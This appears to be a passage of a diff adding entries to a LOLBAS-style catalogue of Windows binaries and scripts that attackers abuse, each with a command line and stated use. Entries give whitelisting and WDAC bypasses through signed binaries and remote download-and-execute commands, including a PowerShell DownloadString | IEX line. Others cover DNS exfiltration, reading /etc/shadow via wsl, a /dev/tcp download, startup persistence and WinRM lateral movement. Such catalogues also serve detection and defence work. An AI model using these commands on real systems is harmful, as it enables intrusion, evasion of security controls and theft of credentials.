+Description : Generate JavaScript payload and package.json, and save to "%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app\\" before executing.
+Usecase : Execute JavaScript code
+                               
+Name : Teams.exe
+Command : teams.exe
+Description : Generate JavaScript payload and package.json, archive in ASAR file and save to "%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app.asar" before executing.
+Usecase : Execute JavaScript code
+                               
+Name : Teams.exe
+Command : teams.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
+Description : Teams spawns cmd.exe as a child process of teams.exe and executes the ping command
+Usecase : Executes a process under a trusted Microsoft signed binary
+                               
+Name : TestWindowRemoteAgent.exe
+Command : TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
+Description : Sends DNS query for open connection to any host, enabling exfiltration over DNS
+Usecase : Attackers may utilize this to exfiltrate data over DNS
+                               
+Name : Tracker.exe
+Command : Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
+Description : Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.
+Usecase : Injection of locally stored DLL file into target process.
+                               
+Name : Tracker.exe
+Command : Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
+Description : Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.
+Usecase : Injection of locally stored DLL file into target process.
+                               
+Name : Update.exe
+Command : Update.exe --download {REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file and download the nuget package.
+Usecase : Download binary
+                               
+Name : Update.exe
+Command : Update.exe --update={REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --update={REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --update={PATH_SMB:folder}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --update={PATH_SMB:folder}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --updateRollback={REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --updateRollback={REMOTEURL}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
+Description : Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
+Usecase : Application Whitelisting Bypass
+                               
+Name : Update.exe
+Command : Update.exe --updateRollback={PATH_SMB:folder}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --updateRollback={PATH_SMB:folder}
+Description : The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+Usecase : Download and execute binary
+                               
+Name : Update.exe
+Command : Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
+Description : Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
+Usecase : Execute binary
+                               
+Name : Update.exe
+Command : Update.exe --createShortcut={PATH:.exe} -l=Startup
+Description : Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a shortcut to the specified executable in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.
+Usecase : Execute binary
+                               
+Name : Update.exe
+Command : Update.exe --removeShortcut={PATH:.exe}-l=Startup
+Description : Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.
+Usecase : Execute binary
+                               
+Name : VSDiagnostics.exe
+Command : VSDiagnostics.exe start 1 /launch:{PATH:.exe}
+Description : Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable.
+Usecase : Proxy execution of binary
+                               
+Name : VSDiagnostics.exe
+Command : VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:"{CMD:args}"
+Description : Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW.
+Usecase : Proxy execution of binary with arguments
+                               
+Name : VSIISExeLauncher.exe
+Command : VSIISExeLauncher.exe -p {PATH:.exe} -a "{CMD:args}"
+Description : The above binary will execute other binary.
+Usecase : Execute any binary with given arguments.
+                               
+Name : Visio.exe
+Command : Visio.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : VisualUiaVerifyNative.exe
+Command : VisualUiaVerifyNative.exe
+Description : Generate Serialized gadget and save to - `C:\Users\%USERNAME%\AppData\Roaminguiverify.config` before executing.
+Usecase : Execute proxied payload with Microsoft signed binary to bypass WDAC policies
+                               
+Name : VSLaunchBrowser.exe
+Command : VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
+Description : Download and execute payload from remote server
+Usecase : It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
+                               
+Name : VSLaunchBrowser.exe
+Command : VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
+Description : Execute payload via VSLaunchBrowser as parent process
+Usecase : It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
+                               
+Name : VSLaunchBrowser.exe
+Command : VSLaunchBrowser.exe .exe {PATH_SMB}
+Description : Execute payload from WebDAV server via VSLaunchBrowser as parent process
+Usecase : It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
+                               
+Name : Vshadow.exe
+Command : vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:
+Description : Executes specified executable from vshadow.exe.
+Usecase : Performs execution of specified executable file.
+                               
+Name : vsjitdebugger.exe
+Command : Vsjitdebugger.exe {PATH:.exe}
+Description : Executes specified executable as a subprocess of Vsjitdebugger.exe.
+Usecase : Execution of local PE file as a subprocess of Vsjitdebugger.exe.
+                               
+Name : WFMFormat.exe
+Command : WFMFormat.exe
+Description : Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5.
+Usecase : Proxy execution of binary
+                               
+Name : Wfc.exe
+Command : wfc.exe {PATH_ABSOLUTE:.xoml}
+Description : Execute arbitrary C# code embedded in a XOML file.
+Usecase : Execute proxied payload with Microsoft signed binary to bypass WDAC policies
+                               
+Name : WinDbg.exe
+Command : windbg.exe -g {CMD}
+Description : Launches a command line through the debugging process; optionally add `-G` to exit the debugger automatically.
+Usecase : Executes an executable under a trusted microsoft signed binary.
+                               
+Name : WinProj.exe
+Command : WinProj.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : Winword.exe
+Command : winword.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : Wsl.exe
+Command : wsl.exe -e /mnt/c/Windows/System32/calc.exe
+Description : Executes calc.exe from wsl.exe
+Usecase : Performs execution of specified file, can be used to execute arbitrary Linux commands.
+                               
+Name : Wsl.exe
+Command : wsl.exe -u root -e cat /etc/shadow
+Description : Cats /etc/shadow file as root
+Usecase : Performs execution of arbitrary Linux commands as root without need for password.
+                               
+Name : Wsl.exe
+Command : wsl.exe --exec bash -c "{CMD}"
+Description : Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)
+Usecase : Performs execution of arbitrary Linux commands.
+                               
+Name : Wsl.exe
+Command : wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+Description : Downloads file from 192.168.1.10
+Usecase : Download file
+                               
+Name : XBootMgr.exe
+Command : xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -callBack {PATH:.exe}
+Description : Executes an executable after the trace is complete using the callBack parameter.
+Usecase : Executes code as part of post-trace automation flow.
+                               
+Name : XBootMgr.exe
+Command : xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -preTraceCmd {PATH:.exe}
+Description : Executes an executable before each trace run using the preTraceCmd parameter.
+Usecase : Executes code as part of pre-trace automation or staging.
+                               
+Name : XBootMgrSleep.exe
+Command : xbootmgrsleep.exe 1000 {PATH:.exe}
+Description : Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution.
+Usecase : Performs execution of specified executable, can be used as a defense evasion
+                               
+Name : devtunnel.exe
+Command : devtunnel.exe host -p 8080
+Description : Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet.
+Usecase : Download Files, Upload Files, Data Exfiltration
+                               
+Name : vsls-agent.exe
+Command : vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}
+Description : Load a library payload using the --agentExtensionPath parameter (32-bit)
+Usecase : Execute proxied payload with Microsoft signed binary
+                               
+Name : vstest.console.exe
+Command : vstest.console.exe {PATH:.dll}
+Description : VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general
+Usecase : Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe
+                               
+Name : winfile.exe
+Command : winfile.exe {PATH:.exe}
+Description : Execute an executable file with WinFile as a parent process.
+Usecase : Performs execution of specified file, can be used as a defense evasion
+                               
+Name : xsd.exe
+Command : xsd.exe {REMOTEURL}
+Description : Downloads payload from remote server
+Usecase : It will download a remote payload and place it in INetCache
+                               
+Name : CL_LoadAssembly.ps1
+Command : powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
+Description : Proxy execute Managed DLL with PowerShell
+Usecase : Execute proxied payload with Microsoft signed binary
+                               
+Name : CL_Mutexverifiers.ps1
+Command : . C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess {PATH:.ps1}
+Description : Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.
+Usecase : Proxy execution
+                               
+Name : CL_Invocation.ps1
+Command : . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke {CMD}
+Description : Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.
+Usecase : Proxy execution
+                               
+Name : Launch-VsDevShell.ps1
+Command : powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}
+Description : Execute binaries from the context of the signed script using the "VsWherePath" flag.
+Usecase : Proxy execution
+                               
+Name : Launch-VsDevShell.ps1
+Command : powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; {PATH:.exe} ;"
+Description : Execute binaries and commands from the context of the signed script using the "VsInstallationPath" flag.
+Usecase : Proxy execution
+                               
+Name : Manage-bde.wsf
+Command : set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
+Description : Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
+Usecase : Proxy execution from script
+                               
+Name : Manage-bde.wsf
+Command : copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
+Description : Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
+Usecase : Proxy execution from script
+                               
+Name : Pubprn.vbs
+Command : pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
+Description : Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
+Usecase : Proxy execution
+                               
+Name : Syncappvpublishingserver.vbs
+Command : SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
+Description : Inject PowerShell script code with the provided arguments
+Usecase : Use Powershell host invoked from vbs script
+                               
+Name : UtilityFunctions.ps1
+Command : powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
+Description : Proxy execute Managed DLL with PowerShell
+Usecase : Execute proxied payload with Microsoft signed binary
+                               
+Name : winrm.vbs
+Command : winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
+Description : Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol
+Usecase : Proxy execution
+                               
+Name : winrm.vbs
+Command : winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
+Description : Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol
+Usecase : Proxy execution
+                               
+Name : winrm.vbs
+Command : %SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
+Description : Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.
+Usecase : Execute arbitrary, unsigned code via XSL script
+                               
+Name : Pester.bat
+Command : Pester.bat [/help|?|-?|/?] "$null; {CMD}"
+Description : Execute code using Pester. The third parameter can be anything. The fourth is the payload.
+Usecase : Proxy execution
+                               
+Name : Pester.bat
+Command : Pester.bat ;{PATH:.exe}
+Description : Execute code using Pester. Example here executes specified executable.
+Usecase : Proxy execution
+                               
